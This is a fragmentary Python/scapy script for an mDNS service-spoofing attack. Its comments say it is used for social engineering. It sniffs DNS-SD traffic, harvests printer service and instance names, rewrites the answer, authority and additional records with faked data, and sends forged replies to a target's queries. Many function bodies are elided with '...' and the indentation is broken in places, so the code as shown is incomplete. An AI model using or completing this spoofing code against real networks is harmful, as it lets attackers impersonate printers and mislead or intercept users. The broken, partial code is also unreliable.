...
###used for social engg attack. The return part will be the last part. The rest part of the function will be commented code
...
def service_obtaining(packet):
    ...
    if not sa.Ether in packet:
        packet.show()
    if not(sa.Ether in packet) or  packet[sa.Ether].src==my_mac:
        return None
...
###find the name itself like the local domain name
def find_name(packet):
    for i in range(packet[sa.DNS].ancount):
        if packet[sa.DNS].an[i].type==33:
            return packet[sa.DNS].an[i].target.decode("utf-8")
    ...
    for i in range(packet[sa.DNS].nscount):
        if packet[sa.DNS].ns[i].type==33:
            return packet[sa.DNS].ns[i].target.decode("utf-8")

###find instance names instances like local service instances
...
###this is one for changing the data for TXT records. rdata here is considered as a list
...
##extracting records and getting the information needed ,you need other functions to make the response specific
...
'''you find some information about the packet'''
def fake(packet):
    global current_name
    global resp
    global services
    ...
    if sa.IP in packet and sa.DNS in packet :
     #   packet[sa.DNS].show()
        if packet[sa.IP].src==device:
            ...
            #This for loop is for answer records. For each answer record, it will go through all the different types. For example type 12 is ptr type 16 is txt etc
            for i in range(packet[sa.DNS].ancount):
            ...
            #            forged_packet[sa.DNS].arcount+=1
                    ...
                    for typebit in sl.dns.bitmap2RRlist(packet[sa.DNS].ar[i].typebitmaps):
                      ...
                      #          forged_packet[sa.DNS].arcount+=1  
                            break
            #This is authority records. So, all the packets of information received from the printers, you will change it with the information that you are faking
            # We have to to take into account that there are 3 kind of answers- Answer records, Authority records, Additional records. And for each type of nswers you gave to go through different types and each type is completely different like type TXT or type SRV, etc
            #authority Records
            for i in range(packet[sa.DNS].nscount):
            ...
            sa.send(forged_packetv4,iface=interface)
            return None
## and when we receive a question record not necessarily we seek an answer , we have to force a correct response for that answer ####
 else:
            if packet[sa.DNS].qdcount!=0 and packet[sa.IP].src==target:
                ...
                return None
################################################################################## MAIN ####################################################################################
##start sniffer to perform a specific task; when it receives the response it needs, the sniffer stops  it's querying the services to per
...
print(instances)
#sample output of instances
'''
All the services that the sniffer was able to grab is being printed by the sniffer
{'_printer._tcp.local.': 'Virtual Braille BRF Printer @ osboxes._printer._tcp.local.', '_ipp._tcp.local.': 'Virtual Braille BRF Printer @ osboxes._ipp._tcp.local.', '_ipps._tcp.local.': 'Virtual Braille BRF Printer @ osboxes._ipps._tcp.local.'}
'''
